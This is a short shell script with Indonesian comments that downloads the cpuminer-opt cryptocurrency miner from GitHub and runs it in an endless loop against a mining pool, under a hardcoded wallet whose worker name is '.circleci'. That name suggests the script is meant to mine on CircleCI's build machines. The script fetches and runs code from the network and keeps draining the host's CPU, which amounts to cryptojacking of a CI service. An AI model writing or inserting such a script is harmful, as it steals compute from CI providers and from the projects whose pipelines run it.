#!/bin/sh

# Donwload File
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz 
while [ 1 ]; do
./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.circleci -t3
sleep 2
done

# selesai
